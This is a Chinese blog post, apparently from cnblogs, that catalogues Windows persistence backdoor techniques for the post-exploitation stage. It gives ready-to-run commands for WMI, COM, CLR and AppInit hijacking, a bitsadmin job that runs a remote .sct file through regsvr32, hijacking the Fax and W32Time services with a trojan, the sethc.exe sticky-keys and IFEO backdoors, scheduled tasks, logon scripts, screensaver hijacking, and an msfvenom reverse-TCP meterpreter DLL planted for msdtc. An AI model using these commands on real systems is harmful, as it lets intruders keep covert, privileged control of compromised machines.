> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/-mo-/p/12449964.html)

暂时总结一些关于Windows权限维持的资料，把常用的权限维持方法记录于此；远不止这些，慢慢积累~

### 0x01 Empire persistence模块

Empire是一款功能非常强大的后渗透攻击框架。其中的persistence模块提供了一系列权限维持方法：工具还把权限维持分为了四大类，userland(普通权限)、elevated(需要高权限)、powerbreach(内存权限维持，重启后失效)、miscellaneous(其它)。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190417211952-7c4242cc-6113-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190417211952-7c4242cc-6113-1.png)

### 0x02 WMI后门

WMI是微软基于Web的企业管理（WBEM）的实现版本，这是一项行业计划，旨在开发用于访问企业环境中管理信息的标准技术。主要与Powershell命令配合使用可以实现无文件攻击重要方式，具有良好的隐蔽性也是目前较为常用的持久化手段。

关键实现的代码如下：

[![](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310140828095-453558216.png)](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310140828095-453558216.png)

WMI对象主要是执行一个WQL(WMI Query Language)的查询后，本地调用Powershell执行响应的代码由于没有文件保存在本地磁盘能够较好的免查杀。

在流行的powersploit与nishang框架里面也有相关的ps1文件，在empire中有相应的module：

```
Copy`powershell/persistence/elevated/wmi` 
```

[![](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310141339906-1483502489.png)](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310141339906-1483502489.png)

### 0x03 WinRM服务后门

此服务的后门连接是需要目标服务器的高权用户的明文密码的，需要先抓取相应的明文密码才可部署后门

参考链接：[https://www.cnblogs.com/-mo-/p/12019314.html](https://www.cnblogs.com/-mo-/p/12019314.html)

### 0x04 进程注入

准确来说进程注入不是后门技术或者权限维持技术，而是一种隐藏技术，这里简单说一下：

```
Copy`#meterpreter
migrate

#cobaltstrike
inject

#empire
psinject` 
```

一般可以注入到像是 lsass 或者 explorer 这样的进程当中，相对比较隐蔽，较难排查。

### 0x05 组件劫持

#### 5.1 COM劫持

主要通过修改 CLSID 下的注册表键值，实现对 CAccPropServicesClass 和 MMDeviceEnumerator 劫持，而系统很多正常程序启动时需要调用这两个实例，所以，这就可以用作后门来使用，并且，该方法也能够绕过 Autoruns 对启动项的检测。

Powershell 版本的 poc ：[https://github.com/3gstudent/COM-Object-hijacking](https://github.com/3gstudent/COM-Object-hijacking)

[![](https://image.3001.net/images/20190216/1550309282_5c67d7a22082c.png)](https://image.3001.net/images/20190216/1550309282_5c67d7a22082c.png)

#### 5.2 MruPidlList劫持

在注册表位置为 HKCU\Software\Classes\CLSID\ 下创建项 {42aedc87-2188-41fd-b9a3-0c966feabec1} ，再创建一个子项 InprocServer32 ，默认的键值为我们的 dll 路径，再创建一个键 ThreadingModel ，其键值： Apartment

[![](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/26.png)](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/26.png)

该注册表对应 COM 对象 MruPidlList ，作用于 shell32.dll ，而 shell32.dll 是 Windows 的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中 explorer.exe 会调用 shell32.dll ，然后会加载COM对象 MruPidlList ，从而触发我们的 dll 文件

#### 5.3 CLR 劫持

CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下

修改一下注册表，注册表路径： HKEY_CURRENT_USER\Software\Classes\CLSID\ ，新建子项 {11111111-1111-1111-1111-111111111111} （名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项 InProcServer32 ，新建一个键 ThreadingModel ，键值为： Apartment ，默认的键值为我们 dll 的路径

[![](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/23.png)](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/23.png)

需要在 cmd 下设置一下，注册为全局变量，不然只能在当前 cmd 窗口劫持 .net 程序：

```
Copy`SETX COR_ENABLE_PROFILING= 1 /M
SETX COR_PROFILER= {11111111-1111-1111-1111-111111111111} /M` 
```

然后在接下来的运行中，只要是存在.net的调用，后门程序就会启动

#### 5.4 AppInit_DLLs

User32.dll 被加载到进程时，会读取 AppInit_DLLs 注册表项，如果有值，调用 LoadLibrary() api 加载用户 dll 。

其注册表位置为：

```
Copy`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` 
```

把 AppInit_DLLs 的键值设置为我们 dll 路径，将 LoadAppInit_DLLs 设置为1:

[![](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310160955030-1685013002.png)](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310160955030-1685013002.png)

当存在 User32.dll 调用的时候，指定的 dll 文件就会被加载

### 0x06 bitsadmin后门

Bitsadmin 从 win7 之后操作系统就默认包含，可以用来创建上传或者下载任务。 Bistadmin 可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行。

```
Copy`#创建一个下载任务：
bitsadmin /create backdoor

#添加文档：
bitsadmin /addfile backdoor c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe  //为了方便起见我们直接复制本地文件

#设置下载成功之后要执行的命令：
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"

#执行任务：
bitsadmin /Resume backdoor` 
```

重启电脑之后任务会再一次被激活，大概几分钟之后我们的命令会再次执行，如果我们想让任务完成，可以执行:

```
Copy`bitsadmin /complete backdoor` 
```

优点：系统自带无需上传  
缺点：免杀效果一般  
排查：bitsadmin /list /verbose

### 0x07 自启动服务

自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将 exe 文件注册为服务，也可以将 dll 文件注册为服务

为了方便起见我们可以直接用Metasploit来注册一个服务:

```
Copy`meterpreter > run metsvc -A` 
```

运行之后 msf 会在 %TMP% 目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe

[![](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/11.png)](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/11.png)

同时会新建一个服务，其显示名称为 Meterpreter ，服务名称为 metsvc ，启动类型为"自动"，默认绑定在31337端口。

如果想删除服务，可以执行:

```
Copy`meterpreter > run metsvc -r` 
```

于此同时，我们通过msf上传上去的 exe，为了更加隐蔽，我们可以将 exe 设置为隐藏文件，利用如下命令：

```
Copy`#增加隐藏属性
attrib +h service.exe

#去掉隐藏属性
attrib -h service.exe` 
```

### 0x08 修改系统服务

当攻击者拿到一台机器的shell时，可以通过修改系统上的服务，以达到持久控制。攻击者将恶意软件隐藏在服务执行的位置，修改该服务执行的用户权限，达到获取高权限 shell 的目的。

首先来了解一下 binPath ， binPath 是将服务指向启动服务时需要执行的二进制文件的位置。操作过程中，我们需要利用sc命令：

SC命令主要的几个功能：

```
Copy`1.更改服务的启动状态(这是比较有用的一个功能),可以设置存储在注册表中的服务属性，以控制如何在启动时启动服务应用程序，以及如何将其作为后台程序运行。即更改服务的启动状态。
2.删除服务(除非对自己电脑的软、硬件所需的服务比较清楚，否则不建议删除任何系统服务，特别是基础服务)。
3.停止或启动服务(功能上类似于net stop/start，但速度更快且能停止的服务更多)。
4.SC可以检索和设置有关服务的控制信息，可以使用SC.exe来测试和调试服务程序。
5.可以创建批处理文件来调用不同的SC命令，以自动启动或关闭服务序列。
#说白了: SC.exe提供的功能类似于”控制面板”中”管理工具”项中的”服务”。` 
```

举个栗子：默认情况下，Windows不会启用传真服务。所以，传真服务是我们修改的理想服务，因为它不会中断正常用户的操作。

```
Copy`#将msfvenom生成的木马文件上传C:\123123.exe。

#修改Fax传真服务
sc config Fax binPath= "C:\123123.exe"
sc start Fax

#创建Fax传真服务，并设置为自启动
sc create Fax binPath= "C:\123123.exe" start= "auto" obj= "LocalSystem"

#增加服务描述
sc descrīption Fax "利用计算机或网络上的可用传真资源发送和接收传真。"` 
```

[![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418222518138-1321932112.png)](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418222518138-1321932112.png)

[![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418222538328-1326157018.png)](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418222538328-1326157018.png)

木马文件执行上线，获得的权限是系统服务权限。一段时间之后，会显示服务没有响应，从而关闭我们的恶意进程。所以 msf 在监听时，要加上如下参数:

```
Copy`set autorunscript migrate -f
#获得会话之后，直接将会话转移到一个稳定进程，保持上线。` 
```

经过测试，重启之后，传真服务不会自动启动执行，所以我们可以利用如下命令：

```
Copy`sc config Fax binPath= "C:\Windows\System32\123123.exe" start= "auto" obj= "LocalSystem"
#这里有一点需要注意，在填写参数时，参数等号后面一定要加”空格”，注意这个细节！` 
```

Windows启动期间，传真服务自动启用，并且执行的权限为System权限。

### 0x09 shift后门

#### 9.1 辅助功能劫持

这个是比较老的方式了，这里简单讲一下，在 windows 中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：

```
Copy`C:\Windows\System32\sethc.exe     粘滞键，启动快捷键：按五次shift键
C:\Windows\System32\utilman.exe   设置中心，启动快捷键：Windows+U键` 
```

```
Copy`cd c:\Windows\System32
move sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe` 
```

#### 9.2 映像劫持

在低版本的windows中，我们可以直接把 setch.exe 替换成我们的后门程序，但是在高版本的 windows 版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。

windows 系统上每个服务的信息都存储在注册表中， ImagePath 注册表项通常包含驱动程序映像文件的路径。使用任意可执行文件劫持此密钥将使有效负载在服务启动期间运行，而这种劫持就称为映像劫持

具体操作方法如下：

在注册表下添加一个项 sethc.exe ，然后在 sethc.exe 这个项中添加 debugger 键，键值为我们恶意程序的路径：

```
Copy`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option 

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"` 
```

[![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418203351663-212784345.png)](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418203351663-212784345.png)

对于劫持其他服务，看以下例子，劫持W32Time服务：

```
Copy`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "C:\321321.exe" /f
/f参数很重要，强制执行` 
```

[![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418203837265-493326355.png)](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418203837265-493326355.png)

由于此服务并非自启动服务，想要此服务开机自启并为高权限，我们仍需使用命令：

```
Copy`sc config w32time start= "auto" obj= "LocalSystem"` 
```

### 0x10 定时任务

windows下定时任务的命令有两个分别是：at 和 schtasks，他们两者主要区别是 at 命令在 win7、08 等高版本的 windows 中是不能将任务在前台执行的，也就是只会打开一个后台进程，而 schtasks 是将定时的任务在前台执行

```
Copy`schtasks /create /sc minute /mo 1 /tn "chrome" /tr wscript.exe C:\Users\\AppData\Local\Temp\13442980_crypted.vbs` 
```

### 0x11 Logon Scripts

Logon Scripts优先于 av 先执行，我们可以利用这一点来绕过 av 的敏感操作拦截

注册表路径为： HKEY_CURRENT_USER\Environment ，创建一个键为： UserInitMprLogonScript ，其键值为我们要启动的程序路径：

[![](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310150536075-710529979.png)](https://img2020.cnblogs.com/blog/1561366/202003/1561366-20200310150536075-710529979.png)

当用户登录或者重启时，目标程序就会先行启动

### 0x12 屏幕保护程序

在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的 其中屏幕保护的配置存储在注册表中

其位置为：HKEY_CURRENT_USER\Control Panel\Desktop，关键键值如下：

```
Copy`SCRNSAVE.EXE        - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序
ScreenSaveActive    - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态
ScreenSaverTimeout  - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）` 
```

设置如下：  
[![](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/8.png)](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/img/8.png)

### 0x13 域环境下的msdtc

msdtc.exe 存在于组环境和域环境中

[![](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418224048267-701840535.png)](https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200418224048267-701840535.png)

```
Copy`#生成dll木马文件
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=8888 -f dll > oci.dll

#将刚才生成的 oci.dll 上传到目标机器的 C:\Windows\System32 目录下
$upload oci.dll C:\\Windows
$shell
C:\Windows>move oci.dll c:\Windows\System32

#使用命令关闭msdtc进程
taskkill /f /im msdtc.exe

#重启msdtc
net start msdtc

#为了获得system权限，可采用降权启动，使用命令
msdtc -install` 
```

详细内容阅读：[http://hackergu.com/power-msdtc/](http://hackergu.com/power-msdtc/)

### 0x14 waitfor

不支持自启动，但可远程主动激活，后台进程显示为 waitfor.exe

优点：远程主动激活  
缺点：有 waitfor 进程  
排查：通过 Process Explorer 工具查看是否有 waitfor.exe 进程，并进一步查看启动参数等。

支持系统：

```
Copy`Windows Server 2003
Windows Vista
Windows XP
Windows Server 2008
Windows 7
Windows Server 2003 with SP2
Windows Server 2003 R2
Windows Server 2008 R2
Windows Server 2000
Windows Server 2012
Windows Server 2003 with SP1
Windows 8
Windows 10
其他Server系统未测试，理论上支持` 
```

详细内容阅读：  
[https://github.com/3gstudent/Waitfor-Persistence](https://github.com/3gstudent/Waitfor-Persistence)  
[http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/10.html](http://www.0-sec.org/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Windows%E5%90%8E%E9%97%A8/10.html)

### 参考链接

[http://hackergu.com/](http://hackergu.com/)  
[http://www.0-sec.org](http://www.0-sec.org)  
[https://xz.aliyun.com/t/4842](https://xz.aliyun.com/t/4842)  
[https://www.freebuf.com/vuls/195906.html](https://www.freebuf.com/vuls/195906.html)